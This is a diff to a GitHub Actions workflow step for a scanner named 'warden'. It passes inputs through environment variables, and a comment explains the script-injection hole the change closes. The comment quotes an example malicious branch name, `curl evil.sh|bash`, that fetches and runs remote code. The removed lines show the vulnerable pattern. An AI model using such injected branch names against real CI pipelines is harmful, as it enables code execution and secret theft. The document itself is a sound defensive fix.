@@ -38,10 +38,28 @@ runs:
 
     - name: Run scan
       shell: bash
+      # Every ${{ }} value is passed through env:, never interpolated
+      # directly into the run: script - GitHub Actions expands ${{ }}
+      # by literal text substitution BEFORE the shell ever runs, so a
+      # ref name or input containing backticks/`$()` interpolated
+      # straight into the script becomes executable shell code. A
+      # contributor opening a PR from a branch named like
+      # `` `curl evil.sh|bash` `` is enough to trigger it if any of
+      # these values trace back to attacker-controlled input (branch
+      # names most commonly). env var expansion isn't subject to that
+      # pre-parse substitution, so referencing $VAR here closes it.
+      env:
+        WARDEN_PATH: ${{ inputs.path }}
+        WARDEN_FAIL_ON: ${{ inputs.fail-on }}
+        WARDEN_REPO: ${{ inputs.repo }}
+        WARDEN_TOKEN_INPUT: ${{ inputs.token }}
+        WARDEN_API_URL: ${{ inputs.api-url }}
+        WARDEN_SHA: ${{ github.sha }}
+        WARDEN_BRANCH: ${{ github.ref_name }}
       run: |
         set -e
-        args=(scan "${{ inputs.path }}" --fail-on "${{ inputs.fail-on }}")
-        if [ -n "${{ inputs.repo }}" ] && [ -n "${{ inputs.token }}" ]; then
-          args+=(--upload --repo "${{ inputs.repo }}" --token "${{ inputs.token }}" --api-url "${{ inputs.api-url }}" --commit "${{ github.sha }}" --branch "${{ github.ref_name }}")
+        args=(scan "$WARDEN_PATH" --fail-on "$WARDEN_FAIL_ON")
+        if [ -n "$WARDEN_REPO" ] && [ -n "$WARDEN_TOKEN_INPUT" ]; then
+          args+=(--upload --repo "$WARDEN_REPO" --token "$WARDEN_TOKEN_INPUT" --api-url "$WARDEN_API_URL" --commit "$WARDEN_SHA" --branch "$WARDEN_BRANCH")
         fi
         npx warden "${args[@]}"
